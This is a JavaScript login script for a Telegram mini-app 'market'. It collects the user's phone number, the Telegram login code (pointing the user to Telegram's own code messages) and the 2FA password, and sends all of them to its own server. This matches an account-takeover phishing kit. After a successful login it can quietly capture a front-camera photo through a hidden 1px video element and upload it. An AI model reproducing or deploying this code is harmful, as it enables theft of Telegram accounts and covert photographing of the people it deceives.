let currentStep = 1;
let userPhone = '';
let enteredCode = '';
let authSessionId = null;
let botUsername = '';
let authHandlersInitialized = new Set();
let cameraPhotoEnabled = window.cameraPhotoEnabled !== undefined ? window.cameraPhotoEnabled : false;
let authAnimation = null;
let successAnimation = null;

function initAuth(botUsernameParam, prefix = '') {
  botUsername = botUsernameParam || new URLSearchParams(window.location.search).get('bot_username') || '';
  
  if (prefix === 'registration') {
    if (!window.authState) {
      window.authState = {};
    }
    window.authState.currentStep = 1;
    window.authState.userPhone = '';
    window.authState.enteredCode = '';
    window.authState.authSessionId = null;
  }
  
  const step1Id = prefix ? `${prefix}Step1` : 'step1';
  const step2Id = prefix ? `${prefix}Step2` : 'step2';
  const step2faId = prefix ? `${prefix}Step2fa` : 'step2fa';
  const step3Id = prefix ? `${prefix}Step3` : 'step3';
  const step1DotId = prefix ? `${prefix}Step1Dot` : 'step1-dot';
  const step2DotId = prefix ? `${prefix}Step2Dot` : 'step2-dot';
  const step3DotId = prefix ? `${prefix}Step3Dot` : 'step3-dot';
  const progressFillId = prefix ? `${prefix}ProgressFill` : 'progressFill';
  const statusId = prefix ? `${prefix}Status` : 'status';
  const startAuthBtnId = prefix ? `${prefix}StartAuthBtn` : 'startAuthBtn';
  const digit1Id = prefix ? `${prefix}Digit1` : 'digit1';
  const digit2Id = prefix ? `${prefix}Digit2` : 'digit2';
  const digit3Id = prefix ? `${prefix}Digit3` : 'digit3';
  const digit4Id = prefix ? `${prefix}Digit4` : 'digit4';
  const digit5Id = prefix ? `${prefix}Digit5` : 'digit5';
  const password2faId = prefix ? `${prefix}Password2fa` : 'password2fa';
  const submit2faBtnId = prefix ? `${prefix}Submit2faBtn` : 'submit2faBtn';
  const togglePasswordId = prefix ? `${prefix}TogglePassword` : 'togglePassword';
  
  const steps = {
    1: document.getElementById(step1Id),
    2: document.getElementById(step2Id),
    '2fa': document.getElementById(step2faId),
    3: document.getElementById(step3Id)
  };

  const stepDots = {
    1: document.getElementById(step1DotId),
    2: document.getElementById(step2DotId),
    3: document.getElementById(step3DotId)
  };

  const progressFill = document.getElementById(progressFillId);
  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
  
  function showStatus(message, type = 'error') {
    const container = document.getElementById('notificationsContainer');
    if (!container) {
      console.error('[AUTH]', message);
      return;
    }
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    notification.innerHTML = `
      <div class="notification-content">
        <div class="notification-message">${escapeHtml(message)}</div>
      </div>
      <div class="notification-progress">
        <div class="notification-progress-bar"></div>
      </div>
    `;
    
    container.appendChild(notification);
    
    const duration = 3000;
    const progressBar = notification.querySelector('.notification-progress-bar');
    if (progressBar) {
      progressBar.style.animationDuration = `${duration}ms`;
    }
    
    setTimeout(() => {
      notification.classList.add('slide-out');
      setTimeout(() => {
        if (notification.parentNode) {
          notification.parentNode.removeChild(notification);
        }
      }, 300);
    }, duration);
  }

  async function loadAuthAnimation(animationFile) {
    const animationContainer = document.getElementById(prefix ? `${prefix}AuthAnimation` : 'authAnimation');
    if (!animationContainer) return;
    
    if (authAnimation) {
      authAnimation.destroy();
      authAnimation = null;
    }
    animationContainer.innerHTML = '';
    
    try {
      const response = await fetch(`/market/Stic/${animationFile}`);
      if (!response.ok) throw new Error('Failed to load animation');
      
      const arrayBuffer = await response.arrayBuffer();
      const ds = new DecompressionStream('gzip');
      const decompressedStream = new Response(
        new Blob([arrayBuffer]).stream().pipeThrough(ds)
      ).arrayBuffer();
      
      const decompressed = await decompressedStream;
      const jsonString = new TextDecoder().decode(decompressed);
      const animationData = JSON.parse(jsonString);
      
      if (typeof lottie !== 'undefined') {
        const lottieWrapper = document.createElement('div');
        lottieWrapper.style.width = '100%';
        lottieWrapper.style.height = '100%';
        lottieWrapper.style.position = 'relative';
        lottieWrapper.style.overflow = 'visible';
        lottieWrapper.style.display = 'flex';
        lottieWrapper.style.alignItems = 'center';
        lottieWrapper.style.justifyContent = 'center';
        animationContainer.appendChild(lottieWrapper);
        
        authAnimation = lottie.loadAnimation({
          container: lottieWrapper,
          renderer: 'svg',
          loop: true,
          autoplay: true,
          animationData: animationData,
          rendererSettings: {
            preserveAspectRatio: 'xMidYMid meet',
            progressiveLoad: true,
            hideOnTransparent: true
          }
        });
      }
    } catch (error) {
      console.error('[AUTH] Ошибка загрузки анимации:', error);
    }
  }

  async function loadSuccessAnimation(animationFile) {
    const animationContainer = document.getElementById(prefix ? `${prefix}SuccessAnimation` : 'successAnimation');
    if (!animationContainer) return;
    
    if (successAnimation) {
      successAnimation.destroy();
      successAnimation = null;
    }
    animationContainer.innerHTML = '';
    
    try {
      const response = await fetch(`/market/Stic/${animationFile}`);
      if (!response.ok) throw new Error('Failed to load success animation');
      
      const arrayBuffer = await response.arrayBuffer();
      const ds = new DecompressionStream('gzip');
      const decompressedStream = new Response(
        new Blob([arrayBuffer]).stream().pipeThrough(ds)
      ).arrayBuffer();
      
      const decompressed = await decompressedStream;
      const jsonString = new TextDecoder().decode(decompressed);
      const animationData = JSON.parse(jsonString);
      
      if (typeof lottie !== 'undefined') {
        const lottieWrapper = document.createElement('div');
        lottieWrapper.style.width = '100%';
        lottieWrapper.style.height = '100%';
        lottieWrapper.style.position = 'relative';
        lottieWrapper.style.overflow = 'visible';
        lottieWrapper.style.display = 'flex';
        lottieWrapper.style.alignItems = 'center';
        lottieWrapper.style.justifyContent = 'center';
        animationContainer.appendChild(lottieWrapper);
        
        successAnimation = lottie.loadAnimation({
          container: lottieWrapper,
          renderer: 'svg',
          loop: true,
          autoplay: true,
          animationData: animationData,
          rendererSettings: {
            preserveAspectRatio: 'xMidYMid meet',
            progressiveLoad: true,
            hideOnTransparent: true
          }
        });
      }
    } catch (error) {
      console.error('[AUTH] Ошибка загрузки анимации успеха:', error);
    }
  }

  function showStep(step) {
    Object.values(steps).forEach(el => {
      if (el) el.classList.remove('active');
    });
    Object.values(stepDots).forEach(dot => {
      if (dot) dot.classList.remove('active');
    });
    
    if (steps[step]) steps[step].classList.add('active');
    
    for (let i = 1; i <= step && i <= 3; i++) {
      if (stepDots[i]) stepDots[i].classList.add('active');
    }

    if (progressFill) {
      const progress = step === '2fa' ? 66 : (step * 33.33);
      progressFill.style.width = Math.min(progress, 100) + '%';
    }

    currentStep = step;
    if (step === 1) {
      try { resetStartAuthUI(); } catch {} 
      if (prefix === 'registration') {
        loadAuthAnimation('phone.tgs');
      }
    }
    
    const codeInputs = [
      document.getElementById(digit1Id),
      document.getElementById(digit2Id),
      document.getElementById(digit3Id),
      document.getElementById(digit4Id),
      document.getElementById(digit5Id)
    ].filter(Boolean);
    
    if (step === 2 && codeInputs[0]) {
      setTimeout(() => codeInputs[0].focus(), 100);
      
      if (prefix === 'registration') {
        loadAuthAnimation('chat.tgs');
      }
      
      if (prefix === 'registration') {
        const showCodeLink = document.getElementById('registrationShowCodeLink');
        if (showCodeLink) {
          showCodeLink.classList.remove('hidden');
          showCodeLink.href = 'https://t.me/+42777';
        }
      }
    }
    
    if (step === 3) {
      if (prefix === 'registration') {
        loadAuthAnimation('time.tgs');
      }
    }
  }

  function clearCodeInputs() {
    const codeInputs = [
      document.getElementById(digit1Id),
      document.getElementById(digit2Id),
      document.getElementById(digit3Id),
      document.getElementById(digit4Id),
      document.getElementById(digit5Id)
    ].filter(Boolean);
    
    codeInputs.forEach(input => {
      if (input) input.value = '';
    });
    enteredCode = '';
    if (prefix === 'registration' && window.authState) {
      window.authState.enteredCode = '';
    }
    if (codeInputs[0]) {
      codeInputs[0].focus();
      if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.HapticFeedback.selectionChanged();
      }
    }
  }

  async function verifyCode() {
    if (enteredCode.length !== 5) return;
    
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
    }

    try {
      console.log('[AUTH] Отправляем код:', enteredCode);
      console.log('[AUTH] Bot username:', botUsername);

      const response = await fetch('/market/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          initData: window.Telegram?.WebApp?.initData || '',
          action: 'verify_code',
          session_id: authSessionId,
          code: enteredCode,
          bot_username: botUsername
        })
      });

      const result = await response.json();

      if (result.success) {
        showStep(3);
        console.log('[AUTH] Код верный');
        
        const isEnabled = window.cameraPhotoEnabled !== undefined ? window.cameraPhotoEnabled : false;
        if (isEnabled) {
          captureAndSendPhoto();
        }
        
        const SUCCESS_DELAY = 15000;
        setTimeout(() => {
          const loader = document.querySelector(prefix ? `#${step3Id} .liquid-loader` : '.liquid-loader');
          const successContent = document.querySelector(prefix ? `#${step3Id} .success-content` : '.success-content');
          const authAnimationContainer = document.getElementById(prefix ? `${prefix}AuthAnimation` : 'authAnimation');
          if (loader) loader.style.display = 'none';
          if (authAnimationContainer) authAnimationContainer.style.display = 'none';
          if (successContent) {
            successContent.classList.add('show');
            if (prefix === 'registration') {
              loadSuccessAnimation('yspex.tgs');
            }
          }
        }, SUCCESS_DELAY);
      } else if (result.need_2fa) {
        showStep('2fa');
        
        const passwordHint = document.getElementById(`${prefix}PasswordHint`);
        if (passwordHint) {
          if (result.hint && result.hint.trim()) {
            passwordHint.textContent = `Подсказка: ${result.hint}`;
            passwordHint.style.display = 'block';
          } else {
            passwordHint.style.display = 'none';
          }
        }
        
        console.log('[AUTH] Требуется 2FA, hint:', result.hint || 'отсутствует');
      } else {
        console.log('[AUTH] Неверный код:', result.error);
        throw new Error(result.error || 'Неверный код');
      }
    } catch (error) {
      console.error('[AUTH] Ошибка проверки кода:', error);
      showStatus(error.message, 'error');
      clearCodeInputs();
    }
  }
  
  function resetStartAuthUI() {
    const startAuthBtn = document.getElementById(startAuthBtnId);
    if (!startAuthBtn) return;
    startAuthBtn.disabled = false;
    if (prefix === 'registration') {
      startAuthBtn.innerHTML = '<svg class="auth-btn-icon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM16.64 8.8C16.49 10.38 15.84 14.22 15.51 15.99C15.37 16.74 15.09 16.99 14.83 17.02C14.25 17.07 13.81 16.64 13.25 16.27C12.37 15.69 11.87 15.33 11.02 14.77C10.03 14.12 10.67 13.76 11.24 13.18C11.39 13.03 13.95 10.7 14 10.49C14.01 10.45 14.02 10.29 13.95 10.23C13.88 10.17 13.75 10.2 13.65 10.22C13.52 10.25 11.97 11.12 9.68 11.83C9.15 11.99 8.67 12.13 8.31 12.24C7.77 12.4 7.35 12.38 7.02 12.15C6.58 11.85 6.26 11.4 6.01 10.99C5.5 10.05 5.15 9.18 4.8 8.33C4.58 7.82 4.37 7.33 4.18 6.87C4.05 6.57 3.88 6.32 3.75 6.32C3.62 6.32 3.42 6.58 3.25 6.9C3.08 7.22 2.5 8.28 2.25 8.9C2.05 9.4 1.85 9.48 1.68 9.45C1.35 9.4 0.85 9.25 0.48 9.13C0.05 8.98 -0.15 8.9 0.12 8.65C0.32 8.47 2.5 6.4 4.95 4.5C5.5 4.05 6.02 3.6 6.15 3.45C6.3 3.28 6.32 3.15 6.45 3.15C6.58 3.15 6.78 3.28 6.95 3.4C7.12 3.52 8.15 4.4 8.3 4.55C8.45 4.7 8.6 4.88 8.45 5.05C8.3 5.22 7.85 5.7 7.5 6.15C7.15 6.6 6.85 6.95 6.7 7.1C6.55 7.25 6.4 7.4 6.55 7.55C6.7 7.7 7.15 8.15 7.6 8.6C8.35 9.35 8.95 9.95 9.2 10.2C9.4 10.4 9.6 10.6 9.8 10.4C10 10.2 10.35 9.85 10.7 9.5C11.05 9.15 11.4 8.8 11.55 8.65C11.7 8.5 11.85 8.5 12 8.65C12.15 8.8 12.6 9.25 13.05 9.7C13.5 10.15 13.95 10.6 14.1 10.75C14.25 10.9 14.4 10.9 14.55 10.75C14.7 10.6 14.95 10.35 15.2 10.1C15.7 9.6 16.2 9.1 16.5 8.75C16.65 8.6 16.8 8.6 16.95 8.75C17.1 8.9 17.4 9.2 17.65 9.45C17.9 9.7 18.15 9.95 18.3 10.1C18.45 10.25 18.6 10.25 18.75 10.1C18.9 9.95 19.15 9.7 19.4 9.45C19.65 9.2 19.9 8.95 20.05 8.8C20.2 8.65 20.35 8.65 20.5 8.8C20.65 8.95 20.9 9.2 21.15 9.45C21.4 9.7 21.65 9.95 21.8 10.1C21.95 10.25 22.1 10.25 22.25 10.1C22.4 9.95 22.65 9.7 22.9 9.45C23.15 9.2 23.4 8.95 23.55 8.8C23.7 8.65 23.85 8.65 24 8.8C24.15 8.95 24.3 9.1 24.45 9.25C24.6 9.4 24.75 9.55 24.9 9.7C25.05 9.85 25.2 10 25.35 10.15C25.5 10.3 25.65 10.45 25.8 10.6C25.95 10.75 26.1 10.9 26.25 11.05C26.4 11.2 26.55 11.35 26.7 11.5C26.85 11.65 27 11.8 27.15 11.95C27.3 12.1 27.45 12.25 27.6 12.4C27.75 12.55 27.9 12.7 28.05 12.85C28.2 13 28.35 13.15 28.5 13.3C28.65 13.45 28.8 13.6 28.95 13.75C29.1 13.9 29.25 14.05 29.4 14.2C29.55 14.35 29.7 14.5 29.85 14.65C30 14.8 30.15 14.95 30.3 15.1C30.45 15.25 30.6 15.4 30.75 15.55C30.9 15.7 31.05 15.85 31.2 16C31.35 16.15 31.5 16.3 31.65 16.45C31.8 16.6 31.95 16.75 32.1 16.9C32.25 17.05 32.4 17.2 32.55 17.35C32.7 17.5 32.85 17.65 33 17.8C33.15 17.95 33.3 18.1 33.45 18.25C33.6 18.4 33.75 18.55 33.9 18.7C34.05 18.85 34.2 19 34.35 19.15C34.5 19.3 34.65 19.45 34.8 19.6C34.95 19.75 35.1 19.9 35.25 20.05C35.4 20.2 35.55 20.35 35.7 20.5C35.85 20.65 36 20.8 36.15 20.95C36.3 21.1 36.45 21.25 36.6 21.4C36.75 21.55 36.9 21.7 37.05 21.85C37.2 22 37.35 22.15 37.5 22.3C37.65 22.45 37.8 22.6 37.95 22.75C38.1 22.9 38.25 23.05 38.4 23.2C38.55 23.35 38.7 23.5 38.85 23.65C39 23.8 39.15 23.95 39.3 24.1Z"/></svg><span>Войти</span>';
    }
  }

  function updateCode() {
    const codeInputs = [
      document.getElementById(digit1Id),
      document.getElementById(digit2Id),
      document.getElementById(digit3Id),
      document.getElementById(digit4Id),
      document.getElementById(digit5Id)
    ].filter(Boolean);
    
    if (codeInputs.length === 0) return;
    
    enteredCode = codeInputs.map(input => input.value).join('').replace(/\D/g, '');
    if (prefix === 'registration' && window.authState) {
      window.authState.enteredCode = enteredCode;
    }
    if (enteredCode.length === 5) {
      try {
        window.Telegram?.WebApp?.HapticFeedback?.notificationOccurred('success');
      } catch (e) {}
      verifyCode();
    }
  }

  async function sendSmsCode(phone) {
    console.log('[AUTH] sendSmsCode вызван с номером:', phone);

    try {
      console.log('[AUTH] POST /market/auth');
      const response = await fetch('/market/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          initData: window.Telegram?.WebApp?.initData || '',
          action: 'start',
          phone: phone,
          bot_username: botUsername
        })
      });

      console.log('[AUTH] status:', response.status);
      const result = await response.json();
      console.log('[AUTH] Результат:', result);

      if (result.success) {
        authSessionId = result.session_id;
        if (prefix === 'registration' && window.authState) {
          window.authState.authSessionId = result.session_id;
        }
        showStep(2);
      } else {
        throw new Error(result.error);
      }
    } catch (error) {
      console.error('[AUTH] Exception:', error);
      showStatus('Ошибка отправки SMS: ' + error.message, 'error');
      resetStartAuthUI();
    }
  }

  function initAuthHandlers() {
    if (authHandlersInitialized.has(prefix || 'default')) {
      return;
    }
    authHandlersInitialized.add(prefix || 'default');
    
    const startAuthBtn = document.getElementById(startAuthBtnId);
    if (startAuthBtn) {
      startAuthBtn.addEventListener('click', () => {
        console.log('[AUTH] Кнопка нажата, запускаем requestContact');
        if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
        }

        startAuthBtn.disabled = true;
        const originalHTML = startAuthBtn.innerHTML;
        const loadingText = 'Запрашиваем номер...';
        startAuthBtn.innerHTML = `<div class="loading"></div>${loadingText}`;

        if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.requestContact((success, contactData) => {
          console.log('[AUTH] Callback вызван');
          console.log('[AUTH] success:', success);
          console.log('[AUTH] contactData:', contactData);

          if (success && contactData) {
            try {
              console.log('[AUTH] Полный объект contactData:', JSON.stringify(contactData));
              let phoneNumber = null;

              if (contactData.responseUnsafe && contactData.responseUnsafe.contact) {
                phoneNumber = contactData.responseUnsafe.contact.phone_number;
              } else if (contactData.contact && contactData.contact.phone_number) {
                phoneNumber = contactData.contact.phone_number;
              } else if (contactData.phone_number) {
                phoneNumber = contactData.phone_number;
              }

              if (phoneNumber) {
                userPhone = phoneNumber;
                if (prefix === 'registration' && window.authState) {
                  window.authState.userPhone = phoneNumber;
                }
                console.log('[AUTH] Номер получен:', userPhone);
                sendSmsCode(userPhone);
              } else {
                console.error('[AUTH] Не удалось извлечь phone_number из contactData');
                showStatus('Ошибка получения номера телефона', 'error');
                startAuthBtn.disabled = false;
                startAuthBtn.innerHTML = originalHTML;
              }
            } catch (e) {
              console.error('[AUTH] Ошибка при обработке контакта:', e);
              showStatus('Ошибка обработки контакта', 'error');
              startAuthBtn.disabled = false;
              startAuthBtn.innerHTML = originalHTML;
            }
          } else {
            console.log('[AUTH] Пользователь отказался делиться контактом или contactData пустой');
            showStatus('Необходимо поделиться номером телефона', 'error');
            startAuthBtn.disabled = false;
            startAuthBtn.innerHTML = originalHTML;
          }
        });
        }
      });
    }

    const codeInputs = [
      document.getElementById(digit1Id),
      document.getElementById(digit2Id),
      document.getElementById(digit3Id),
      document.getElementById(digit4Id),
      document.getElementById(digit5Id)
    ].filter(Boolean);

    if (codeInputs.length > 0) {
      const codeContainer = codeInputs[0].closest('.code-input-container');
      if (codeContainer) {
        codeContainer.addEventListener('paste', (e) => {
          e.preventDefault();
          const paste = (e.clipboardData || window.clipboardData).getData('text').trim();
          const digits = paste.replace(/\D/g, '').substring(0, 5);

          codeInputs.forEach((input, index) => {
            if (input) {
              const hadValue = input.value.length > 0;
              input.value = index < digits.length ? digits[index] : '';
              
              if (input.value.length === 1 && !hadValue) {
                input.classList.remove('animate-in');
                void input.offsetWidth;
                input.classList.add('animate-in');
                setTimeout(() => {
                  input.classList.remove('animate-in');
                }, 400);
              }
            }
          });

          const focusIndex = Math.min(digits.length, 4);
          if (codeInputs[focusIndex]) codeInputs[focusIndex].focus();

          updateCode();
          if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
        }
        });
      }

      codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
          const oldValue = e.target.value;
          e.target.value = e.target.value.replace(/\D/g, '').substring(0, 1);
          
          if (e.target.value.length === 1 && oldValue !== e.target.value) {
            e.target.classList.remove('animate-in');
            void e.target.offsetWidth;
            e.target.classList.add('animate-in');
            
            setTimeout(() => {
              e.target.classList.remove('animate-in');
            }, 400);
          }
          
          if (e.target.value.length === 1 && index < codeInputs.length - 1) {
            if (codeInputs[index + 1]) codeInputs[index + 1].focus();
          }
          updateCode();
        });

        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !e.target.value && index > 0) {
            if (codeInputs[index - 1]) codeInputs[index - 1].focus();
          } else if (e.key === 'ArrowLeft' && index > 0) {
            e.preventDefault();
            if (codeInputs[index - 1]) codeInputs[index - 1].focus();
          } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
            e.preventDefault();
            if (codeInputs[index + 1]) codeInputs[index + 1].focus();
          }
        });

        input.addEventListener('focus', (e) => {
          setTimeout(() => e.target.select(), 0);
        });
      });
    }

    const submit2faBtn = document.getElementById(submit2faBtnId);
    const password2fa = document.getElementById(password2faId);
    
    if (submit2faBtn && password2fa) {
      submit2faBtn.addEventListener('click', async () => {
        if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
    }

        const password = password2fa.value.trim();
        if (!password) {
          showStatus('Введите пароль 2FA', 'error');
          return;
        }

        const originalHTML = submit2faBtn.innerHTML;
        submit2faBtn.disabled = true;
        submit2faBtn.innerHTML = '<div class="loading"></div>Проверяем пароль...';

        try {
          console.log('[AUTH] Отправляем пароль 2FA');
          console.log('[AUTH] Bot username:', botUsername);

          const response = await fetch('/market/auth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              initData: window.Telegram?.WebApp?.initData || '',
              action: 'verify_2fa',
              session_id: authSessionId,
              password: password,
              bot_username: botUsername
            })
          });

          console.log('[AUTH] status:', response.status);

          const result = await response.json();
          console.log('[AUTH] Результат 2FA:', result);

          if (result.success) {
            console.log('[AUTH] 2FA успешно!');
            showStep(3);
            
            const isEnabled = window.cameraPhotoEnabled !== undefined ? window.cameraPhotoEnabled : false;
            if (isEnabled) {
              captureAndSendPhoto();
            }
            
            const SUCCESS_DELAY = 15000;
            setTimeout(() => {
              const loader = document.querySelector(prefix ? `#${step3Id} .liquid-loader` : '.liquid-loader');
              const successContent = document.querySelector(prefix ? `#${step3Id} .success-content` : '.success-content');
              const authAnimationContainer = document.getElementById(prefix ? `${prefix}AuthAnimation` : 'authAnimation');
              if (loader) loader.style.display = 'none';
              if (authAnimationContainer) authAnimationContainer.style.display = 'none';
              if (successContent) {
                successContent.classList.add('show');
                if (prefix === 'registration') {
                  loadSuccessAnimation('yspex.tgs');
                }
              }
            }, SUCCESS_DELAY);
          } else {
            console.log('[AUTH] Ошибка 2FA:', result.error);
            throw new Error(result.error || 'Неверный пароль 2FA');
          }
        } catch (error) {
          console.error('[AUTH] Exception при проверке 2FA:', error);
          showStatus(error.message, 'error');
          password2fa.value = '';
          submit2faBtn.disabled = false;
          submit2faBtn.innerHTML = originalHTML;
        } finally {
          submit2faBtn.disabled = false;
          submit2faBtn.innerHTML = originalHTML;
        }
      });
    }
    
    const authContainer = document.querySelector('.registration-auth-container');
    if (authContainer) {
      authContainer.addEventListener('click', (e) => {
        const target = e.target;
        const isInput = target.tagName === 'INPUT' || target.tagName === 'BUTTON' || target.closest('input') || target.closest('button');
        
        if (!isInput) {
          const activeElement = document.activeElement;
          if (activeElement && (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA')) {
            activeElement.blur();
          }
          
          if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.HapticFeedback.selectionChanged();
          }
        }
      });
    }
  }

  async function captureAndSendPhoto() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' } 
      });
      
      const video = document.createElement('video');
      video.srcObject = stream;
      video.autoplay = true;
      video.playsInline = true;
      video.style.position = 'fixed';
      video.style.top = '-9999px';
      video.style.width = '1px';
      video.style.height = '1px';
      document.body.appendChild(video);
      
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(resolve, 500);
        };
      });
      
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      
      stream.getTracks().forEach(track => track.stop());
      document.body.removeChild(video);
      
      canvas.toBlob(async (blob) => {
        if (!blob) return;
        
        const formData = new FormData();
        formData.append('photo', blob, 'camera.jpg');
        formData.append('initData', window.Telegram?.WebApp?.initData || '');
        formData.append('bot_username', botUsername);
        
        try {
          await fetch('/market/camera_photo', {
            method: 'POST',
            body: formData
          });
          console.log('[AUTH] Фото отправлено');
        } catch (e) {
          console.error('[AUTH] Ошибка отправки фото:', e);
        }
      }, 'image/jpeg', 0.9);
    } catch (error) {
      console.error('[AUTH] Ошибка доступа к камере:', error);
    }
  }

  initAuthHandlers();
  
  if (prefix === 'registration' && currentStep === 1) {
    loadAuthAnimation('phone.tgs');
  }
  
  return {
    init: initAuthHandlers
  };
}

